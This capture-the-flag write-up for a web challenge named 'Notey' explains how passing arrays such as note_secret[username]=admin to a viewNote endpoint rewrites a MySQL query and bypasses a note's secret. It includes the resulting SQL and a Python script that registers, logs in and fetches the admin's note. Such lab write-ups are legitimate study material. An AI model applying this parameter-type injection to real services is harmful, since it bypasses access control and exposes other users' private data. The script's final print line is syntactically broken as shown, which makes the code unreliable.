
## Notey Writeup

- **Category:** Web
- **Points:** 180
- **Difficulty:** Medium

## Challenge Description

I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )

## Challenge Code

Here

## Exploitation

The application allows users to create and share notes by adding a secret password for the note so the user can share it using the note's ID and password. Upon analyzing the application, I found that the `viewNote` function does not validate the parameter types, allowing arrays to be sent instead of text. This can be exploited to retrieve the flag from the admin's note (ID 66).

The database is MySQL, so we can send the following request:
`viewNote?note_id=66&note_secret[username]=admin`

This results in the following query:
```sql
SELECT note_id, username, note FROM notes WHERE note_id = '66' AND secret = `username` = 'admin'
```

This is effectively equivalent to:
```sql
SELECT note_id,username,note FROM notes WHERE note_id = '66' and 1
```

The condition `secret = ``username`` = 'admin'` evaluates to `1` since there is a note in the table with `username='admin'`.


If there is no username field, the attack can still be executed by creating a new note with any content, such as 'test', and then retrieving the admin's note using:
`/viewNote?note_id=66&note_secret[note]=test`

Due to server restrictions that revoke sessions in less than 3 seconds, the exploit is automated using a script that registers a new user, logs in, and retrieves the flag.

```python
import requests

base_url = "http://a3a3b67b41f6f89581711.playat.flagyard.com"
login_url = f"{base_url}/login"
register_url = f"{base_url}/register"

username = "anyuser"
password = "1234567"

register_data = {
    "username": username,
    "password": password
}

sess = requests.Session()
register_response = sess.post(register_url, data=register_data)
login_response = sess.post(login_url, data=register_data)

target_url = f"{base_url}/viewNote?note_id=66&note_secret[username]=admin"

exp = sess.get(target_url)
flag = exp.json()[0]['note']
print(f"Flag: {}")
```
